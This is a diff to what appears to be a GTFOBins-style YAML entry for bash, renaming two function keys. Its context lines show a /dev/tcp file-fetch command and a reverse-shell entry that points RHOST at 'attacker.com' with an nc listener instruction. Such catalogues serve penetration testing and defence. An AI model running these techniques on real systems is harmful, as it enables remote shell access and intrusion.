@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - code: bash
   sudo-enabled:
     - code: sudo bash
@@ -34,7 +34,7 @@ functions:
         export RPORT=12345
         export LFILE=file_to_get
         bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
